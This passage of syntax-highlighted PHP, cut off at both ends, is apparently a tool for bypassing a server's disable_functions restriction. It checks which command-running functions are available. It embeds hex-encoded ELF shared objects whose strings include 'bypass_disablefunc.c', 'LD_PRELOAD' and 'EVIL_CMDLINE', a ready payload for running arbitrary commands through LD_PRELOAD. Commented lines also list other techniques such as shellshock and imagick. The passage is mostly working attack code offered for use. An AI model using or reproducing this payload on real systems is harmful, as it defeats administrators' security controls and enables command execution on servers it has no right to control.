define(<span class="name">OS</span>, <span class="string">'Darwin'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">OS</span>, <span class="string">'Linux'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">unset(<span class="name">$OS</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">define(<span class="name">WRITE_DIR</span>, sys_get_temp_dir() . DIRECTORY_SEPARATOR);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">define(<span class="name">FAILURE</span>, <span class="string">'3ee28fe1a60c95b89d29317f122c7021'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$disable_function_str = get_cfg_var(<span class="name">"disable_functions"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$disable_function_arr = explode(<span class="name">","</span>,$disable_function_str);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$vul_function_str = <span class="string">'dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,error_log,mb_send_mail,putenv,ini_set,apache_setenv,symlink,link'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$vul_function_arr = explode(<span class="name">","</span>, $vul_function_str);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$open_basedir = get_cfg_var(<span class="name">"open_basedir"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$myscript = $_SERVER['PHP_SELF'];</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["system_so_x64"] = <span class="string">"7f454c4602010100000000000000000003003e0001000000c006000000000000400000000000000028140000000000000000000040003800060040001c001900010000000500000000000000000000000000000000000000000000000000000004090000000000000409000000000000000020000000000001000000060000000809000000000000080920000000000008092000000000005802000000000000600200000000000000002000000000000200000006000000280900000000000028092000000000002809200000000000c001000000000000c0010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050e57464040000008408000000000000840800000000000084080000000000001c000000000000001c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000040000001400000003000000474e550066bb9e247f3731670b5cdfd534ac53233e576aef00000000030000000d000000010000000600000088c22001001440090d0000000f000000110000004245d5ecbbe3927cd871581cb98df10eead3ef0e6d1287c2000000000000000000000000000000000000000000000000000000000000000003000900380600000000000000000000000000007d00000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008b00000012000000000000000000000000000000000000009d00000021000000000000000000000000000000000000000100000020000000000000000000000000000000000000009e00000011000000000000000000000000000000000000006100000020000000000000000000000000000000000000009c0000001100000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000840000001200000000000000000000000000000000000000a600000010001600600b2000000000000000000000000000b900000010001700680b2000000000000000000000000000ad00000010001700600b20000000000000000000000000001000000012000900380600000000000000000000000000001600000012000c00600800000000000000000000000000007500000012000b00c0070000000000009d00000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200000002000200000002000000020000000200020001000100010001000100010001000100920000001000000000000000751a690900000200be00000000000000080920000000000008000000000000009007000000000000180920000000000008000000000000005007000000000000580b2000000000000800000000000000580b200000000000100920000000000001000000120000000000000000000000e80a20000000000006000000030000000000000000000000f00a20000000000006000000060000000000000000000000f80a20000000000006000000070000000000000000000000000b20000000000006000000080000000000000000000000080b200000000000060000000a0000000000000000000000100b200000000000060000000b0000000000000000000000300b20000000000007000000020000000000000000000000380b20000000000007000000040000000000000000000000400b20000000000007000000060000000000000000000000480b200000000000070000000b0000000000000000000000500b200000000000070000000c00000000000000000000004883ec08488b05ad0420004885c07405e8430000004883c408c30000000000000000000000000000ff35ba042000ff25bc0420000f1f4000ff25ba0420006800000000e9e0ffffffff25b20420006801000000e9d0ffffffff25aa0420006802000000e9c0ffffffff25a20420006803000000e9b0ffffffff259a0420006804000000e9a0ffffff488d3d99042000488d0599042000554829f84889e54883f80e7615488b05060420004885c074095dffe0660f1f4400005dc366666666662e0f1f840000000000488d3d59042000488d3552042000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05d90320004885c0740c5dffe0660f1f8400000000005dc366666666662e0f1f840000000000803d0904200000752748833daf03200000554889e5740c488b3dea032000e82dffffffe848ffffff5dc605e003200001f3c366666666662e0f1f840000000000488d3d8901200048833f00750be95effffff660f1f440000488b05510320004885c074e9554889e5ffd05de940ffffff554889e54883ec10488d3d9a000000e89cfeffff488945f0c745fc00000000eb4f488b0510032000488b008b55fc4863d248c1e2034801d0488b00488d35740000004889c7e8a6feffff4885c0741d488b05e2022000488b008b55fc4863d248c1e2034801d0488b00c600008345fc01488b05c1022000488b008b55fc4863d248c1e2034801d0488b004885c07592488b45f04889c7e825feffffc9c30000004883ec084883c408c34556494c5f434d444c494e45004c445f5052454c4f414400000000011b033b1800000002000000dcfdffff340000003cffffff5c0000001400000000000000017a5200017810011b0c070890010000240000001c000000a0fdffff60000000000e10460e184a0f0b770880003f1a3b2a332422000000001c00000044000000d8feffff9d00000000410e108602430d0602980c0708000000000000000000009007000000000000000000000000000050070000000000000000000000000000010000000000000092000000000000000c0000000000000038060000000000000d000000000000006008000000000000190000000000000008092000000000001b0000000000000010000000000000001a0000000000000018092000000000001c000000000000000800000000000000f5feff6f00000000b8010000000000000500000000000000c0030000000000000600000000000000f8010000000000000a00000000000000ca000000000000000b0000000000000018000000000000000300000000000000180b20000000000002000000000000007800000000000000140000000000000007000000000000001700000000000000c0050000000000000700000000000000d0040000000000000800000000000000f00000000000000009000000000000001800000000000000feffff6f00000000b004000000000000ffffff6f000000000100000000000000f0ffff6f000000008a04000000000000f9ffff6f0000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000280920000000000000000000000000000000000000000000760600000000000086060000000000009606000000000000a606000000000000b606000000000000580b2000000000004743433a202844656269616e20342e392e322d31302b6465623875322920342e392e3200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200b80100000000000000000000000000000000000003000300f80100000000000000000000000000000000000003000400c003000000000000000000000000000000000000030005008a0400000000000000000000000000000000000003000600b00400000000000000000000000000000000000003000700d00400000000000000000000000000000000000003000800c00500000000000000000000000000000000000003000900380600000000000000000000000000000000000003000a00600600000000000000000000000000000000000003000b00c00600000000000000000000000000000000000003000c00600800000000000000000000000000000000000003000d00690800000000000000000000000000000000000003000e00840800000000000000000000000000000000000003000f00a00800000000000000000000000000000000000003001000080920000000000000000000000000000000000003001100180920000000000000000000000000000000000003001200200920000000000000000000000000000000000003001300280920000000000000000000000000000000000003001400e80a20000000000000000000000000000000000003001500180b20000000000000000000000000000000000003001600580b20000000000000000000000000000000000003001700600b2000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001200200920000000000000000000000000001900000002000b00c00600000000000000000000000000002e00000002000b00000700000000000000000000000000004100000002000b00500700000000000000000000000000005700000001001700600b20000000000001000000000000006600000001001100180920000000000000000000000000008d00000002000b0090070000000000000000000000000000990000000100100008092000000000000000000000000000b80000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000cd00000001000f0000090000000000000000000000000000db0000000100120020092000000000000000000000000000000000000400f1ff00000000000000000000000000000000e700000001001600580b2000000000000000000000000000f40000000100130028092000000000000000000000000000fd00000001001600600b20000000000000000000000000000901000001001500180b20000000000000000000000000001f01000012000000000000000000000000000000000000003301000020000000000000000000000000000000000000004f01000010001600600b20000000000000000000000000005601000012000c00600800000000000000000000000000005c01000012000000000000000000000000000000000000007001000020000000000000000000000000000000000000007f01000011000000000000000000000000000000000000009401000010001700680b20000000000000000000000000009901000010001700600b2000000000000000000000000000a501000012000b00c0070000000000009d00000000000000ad0100002000000000000000000000000000000000000000c10100001100000000000000000000000000000000000000d80100002000000000000000000000000000000000000000f201000022000000000000000000000000000000000000000e02000012000900380600000000000000000000000000001402000012000000000000000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e65730072656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e36363730005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006279706173735f64697361626c6566756e632e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f6564617461005f66696e690073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f00656e7669726f6e4040474c4942435f322e322e35005f656e64005f5f6273735f7374617274007072656c6f6164005f4a765f5265676973746572436c6173736573005f5f656e7669726f6e4040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e6974007374727374724040474c4942435f322e322e3500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000b801000000000000b8010000000000003c00000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000f801000000000000f801000000000000c80100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c003000000000000c003000000000000ca0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000008a040000000000008a04000000000000260000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b004000000000000b004000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000d004000000000000d004000000000000f0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000c005000000000000c0050000000000007800000000000000030000000a0000000800000000000000180000000000000078000000010000000600000000000000380600000000000038060000000000001a00000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000006006000000000000600600000000000060000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c006000000000000c0060000000000009d01000000000000000000000000000010000000000000000000000000000000840000000100000006000000000000006008000000000000600800000000000009000000000000000000000000000000040000000000000000000000000000008a00000001000000020000000000000069080000000000006908000000000000180000000000000000000000000000000100000000000000000000000000000092000000010000000200000000000000840800000000000084080000000000001c00000000000000000000000000000004000000000000000000000000000000a0000000010000000200000000000000a008000000000000a0080000000000006400000000000000000000000000000008000000000000000000000000000000aa0000000e0000000300000000000000080920000000000008090000000000001000000000000000000000000000000008000000000000000000000000000000b60000000f0000000300000000000000180920000000000018090000000000000800000000000000000000000000000008000000000000000000000000000000c2000000010000000300000000000000200920000000000020090000000000000800000000000000000000000000000008000000000000000000000000000000c700000006000000030000000000000028092000000000002809000000000000c001000000000000040000000000000008000000000000001000000000000000d0000000010000000300000000000000e80a200000000000e80a0000000000003000000000000000000000000000000008000000000000000800000000000000d5000000010000000300000000000000180b200000000000180b0000000000004000000000000000000000000000000008000000000000000800000000000000de000000010000000300000000000000580b200000000000580b0000000000000800000000000000000000000000000008000000000000000000000000000000e4000000080000000300000000000000600b200000000000600b0000000000000800000000000000000000000000000001000000000000000000000000000000e90000000100000030000000000000000000000000000000600b0000000000002400000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000840b000000000000f200000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000780c00000000000088050000000000001b0000002b0000000800000000000000180000000000000009000000030000000000000000000000000000000000000000120000000000002802000000000000000000000000000001000000000000000000000000000000"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["system_so_x32"] = <span class="string">"7f454c4601010100000000000000000003000300010000001004000034000000080800000000000034002000050028001b00180001000000000000000000000000000000f0050000f0050000050000000010000001000000f0050000f0150000f01500000c010000140100000600000000100000020000000c0600000c1600000c160000c0000000c0000000060000000400000004000000d4000000d4000000d40000002400000024000000040000000400000051e5746400000000000000000000000000000000000000000600000004000000040000001400000003000000474e550046274bfc049fbd2fbee3fc9508888b1312b57aab030000000a00000002000000060000008800200100d640090a0000000c0000000e000000bae3927c4345d5ecd871581cb98df10e6c1287c2ebd3ef0e00000000000000000000000000000000010000000000000000000000200000002b0000000000000000000000200000004700000000000000000000001200000055000000000000000000000012000000680000000000000000000000110000004e00000000000000000000001200000067000000000000000000000021000000660000000000000000000000110000001c0000000000000000000000220000008300000004170000000000001000f1ff70000000fc160000000000001000f1ff77000000fc160000000000001000f1ff100000007c03000000000000120009003f000000e00400009400000012000b0016000000b80500000000000012000c00005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e300000000000000002000200020002000200020003000100010001000100010001000000010002005c0000001000000000000000731f69090000030088000000100000001069690d0000020094000000000000000816000008000000f4150000010e0000cc16000006010000d016000006020000d416000006050000d816000006090000e816000007010000ec16000007030000f016000007040000f416000007060000f8160000070900005589e55383ec04e8000000005b81c3541300008b93f0ffffff85d27405e81e000000e8fd000000e8d8010000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffffffa3140000006810000000e9c0ffffffffa3180000006818000000e9b0ffffffffa31c0000006820000000e9a0ffffff000000005589e55653e8bf00000081c3c21200008d6424f080bb2000000000755c8b83fcffffff85c0740e8d832cffffff890424e8b7ffffff8db324ffffff8d9320ffffff29d68b8324000000c1fe0283ee0139f0731f908d74260083c001898324000000ff948320ffffff8b832400000039f072e6c68320000000018d6424105b5e5dc3eb0d909090909090909090909090905589e553e83000000081c3331200008d6424ec8b9328ffffff85d274158b83f4ffffff85c0740b8d9328ffffff891424ffd08d6424145b5dc38b1c24c39090905589e55383ec24e8edffffff81c3f01100008d83f8eeffff890424e8ccfeffff8945f0c745f400000000eb418b83f8ffffff8b008b55f4c1e20201d08b008d9305efffff89542404890424e8bcfeffff85c074158b83f8ffffff8b008b55f4c1e20201d08b00c600008345f4018b83f8ffffff8b008b55f4c1e20201d08b0085c075a98b45f0890424e86efeffff83c4245b5dc39090909090909090909090905589e55653e84fffffff81c3521100008b8318ffffff83f8ff74198db318ffffff8db426000000008d76fcffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c318110000e840feffff595bc9c34556494c5f434d444c494e45004c445f5052454c4f41440000000000ffffffff0000000000000000ffffffff000000000000000008160000010000005c0000000c0000007c0300000d000000b8050000f5feff6ff8000000050000003402000006000000340100000a0000009e0000000b0000001000000003000000dc160000020000002800000014000000110000001700000054030000110000002403000012000000300000001300000008000000feffff6ff4020000ffffff6f01000000f0ffff6fd2020000faffff6f0100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c1600000000000000000000c2030000d2030000e2030000f2030000020400004743433a2028474e552920342e342e3720323031323033313320285265642048617420342e342e372d32332900002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000d4000000d400000024000000000000000000000004000000000000002e000000f6ffff6f02000000f8000000f80000003c00000003000000000000000400000004000000380000000b000000020000003401000034010000000100000400000001000000040000001000000040000000030000000200000034020000340200009e0000000000000000000000010000000000000048000000ffffff6f02000000d2020000d2020000200000000300000000000000020000000200000055000000feffff6f02000000f4020000f40200003000000004000000010000000400000000000000640000000900000002000000240300002403000030000000030000000000000004000000080000006d0000000900000002000000540300005403000028000000030000000a00000004000000080000007600000001000000060000007c0300007c0300003000000000000000000000000400000000000000710000000100000006000000ac030000ac03000060000000000000000000000004000000040000007c00000001000000060000001004000010040000a801000000000000000000001000000000000000820000000100000006000000b8050000b80500001c00000000000000000000000400000000000000880000000100000002000000d4050000d40500001800000000000000000000000100000000000000900000000100000002000000ec050000ec05000004000000000000000000000004000000000000009a0000000100000003000000f0150000f00500000c00000000000000000000000400000000000000a10000000100000003000000fc150000fc0500000800000000000000000000000400000000000000a8000000010000000300000004160000040600000400000000000000000000000400000000000000ad000000010000000300000008160000080600000400000000000000000000000400000000000000ba00000006000000030000000c1600000c060000c000000004000000000000000400000008000000c30000000100000003000000cc160000cc0600001000000000000000000000000400000004000000c80000000100000003000000dc160000dc0600002000000000000000000000000400000004000000d10000000800000003000000fc160000fc0600000800000000000000000000000400000000000000d6000000010000003000000000000000fc0600002d000000000000000000000001000000010000001100000003000000000000000000000029070000df0000000000000000000000010000000000000001000000020000000000000000000000400c0000900300001a0000002b000000040000001000000009000000030000000000000000000000d00f0000df010000000000000000000001000000000000000000000000000000000000000000000000000000d4000000000000000300010000000000f80000000000000003000200000000003401000000000000030003000000000034020000000000000300040000000000d2020000000000000300050000000000f402000000000000030006000000000024030000000000000300070000000000540300000000000003000800000000007c030000000000000300090000000000ac0300000000000003000a0000000000100400000000000003000b0000000000b80500000000000003000c0000000000d40500000000000003000d0000000000ec0500000000000003000e0000000000f01500000000000003000f0000000000fc15000000000000030010000000000004160000000000000300110000000000081600000000000003001200000000000c160000000000000300130000000000cc160000000000000300140000000000dc160000000000000300150000000000fc1600000000000003001600000000000000000000000000030017000100000000000000000000000400f1ff0c000000f01500000000000001000f001a000000fc15000000000000010010002800000004160000000000000100110035000000100400000000000002000b004b000000fc16000001000000010016005a00000000170000040000000100160068000000a00400000000000002000b000100000000000000000000000400f1ff74000000f81500000000000001000f0081000000ec0500000000000001000e008f0000000416000000000000010011009b000000800500000000000002000b00b100000000000000000000000400f1ffc6000000dc160000000000000100f1ffdc000000081600000000000001001200e9000000001600000000000001001000f6000000d90400000000000002000b000d0100000c160000000000000100f1ff16010000e00400009400000012000b001e0100000000000000000000200000002d0100000000000000000000200000004101000000000000000000001200000053010000b80500000000000012000c00590100000000000000000000120000006b0100000000000000000000110000007e01000000000000000000001200000090010000fc160000000000001000f1ff9c01000004170000000000001000f1ffa1010000000000000000000011000000b6010000fc160000000000001000f1ffbd010000000000000000000022000000d90100007c03000000000000120009000063727473747566662e63005f5f43544f525f4c4953545f5f005f5f44544f525f4c4953545f5f005f5f4a43525f4c4953545f5f005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e353938360064746f725f6964782e35393838006672616d655f64756d6d79005f5f43544f525f454e445f5f005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f646f5f676c6f62616c5f63746f72735f617578006279706173735f64697361626c6566756e632e63005f474c4f42414c5f4f46465345545f5441424c455f005f5f64736f5f68616e646c65005f5f44544f525f454e445f5f005f5f693638362e6765745f70635f7468756e6b2e6278005f44594e414d4943007072656c6f6164005f5f676d6f6e5f73746172745f5f005f4a765f5265676973746572436c617373657300676574656e764040474c4942435f322e30005f66696e690073797374656d4040474c4942435f322e3000656e7669726f6e4040474c4942435f322e30007374727374724040474c4942435f322e30005f5f6273735f7374617274005f656e64005f5f656e7669726f6e4040474c4942435f322e30005f6564617461005f5f6378615f66696e616c697a654040474c4942435f322e312e33005f696e697400"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["php_so_x64"] = <span class="string">""</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["php_so_x32"] = <span class="string">""</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//$plugin_func_arr = array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="name">"common_exec_cmd"</span> =&gt; array(<span class="name">"exec"</span>, <span class="string">"shell_exec"</span>, <span class="string">"system"</span>, <span class="string">"passthru"</span>, <span class="string">"popen"</span>, <span class="string">"proc_open"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"load_so"</span> =&gt; array(<span class="name">"dl"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"ld_preload_so"</span> =&gt; array(<span class="name">"mail"</span>, <span class="string">"error_log"</span>, <span class="string">"imap_mail"</span>, <span class="string">"mb_send_mail"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"shellshock"</span> =&gt; array(<span class="name">"mail"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"apache_mod_cgi"</span> =&gt; array(),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"imagick"</span> =&gt; array(),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"pwn"</span> =&gt; array(),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Temp Dir:"</span> . WRITE_DIR . <span class="string">"&lt;br&gt;"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Arch: "</span> . ARCH . <span class="string">"; OS: "</span> . OS . <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">foreach (<span class="name">$vul_function_arr</span> as $func) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">function_exists</span>(<span class="name">$func</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            echo <span class="string">"&lt;font style='color: red'&gt;Exist: "</span>.$func."&lt;/font&gt;&lt;br&gt;";</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            echo <span class="string">"no exist: "</span>.$func."&lt;br&gt;";</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function read_file(<span class="name">$filename</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">function_exists</span>(<span class="name">'file_get_contents'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return file_get_contents(<span class="name">$filename</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'fopen'</span>) &amp;&amp; function_exists(<span class="name">'fread'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $handle = fopen(<span class="name">$filename</span>, <span class="string">'r'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        while(!<span class="name">feof</span>(<span class="name">$handle</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $content .= fread(<span class="name">$handle</span>, <span class="number">1000</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        fclose(<span class="name">$handle</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return $content;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        echo <span class="string">"no read function"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function write_file(<span class="name">$filename</span>, $content, <span class="attr">$model</span>=<span class="string">"w"</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'file_put_contents'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        file_put_contents(<span class="name">$filename</span>, $content);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        echo <span class="string">"no write function"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function random_str(<span class="name">$len</span> = <span class="number">8</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $s = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    for (<span class="name">$i</span> = <span class="number">0</span>; $i &lt; $len; $i++) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $s .= chr(<span class="name">mt_rand</span>(<span class="name">33</span>, <span class="number">126</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $s;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function is_x64() {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $int = <span class="string">"9223372036854775807"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $int = intval(<span class="name">$int</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">$int</span> == <span class="number">9223372036854775807</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    elseif (<span class="name">$int</span> == <span class="number">2147483647</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return <span class="string">"error"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function trans_cmd(<span class="name">$cmd</span>, $outfile){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">OS</span> == <span class="string">'Windows'</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd = $cmd . <span class="string">" &gt; "</span> . $outfile;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd = $cmd . <span class="string">" &gt; "</span> . $outfile . <span class="string">" 2&gt;&amp;1"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $cmd;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span 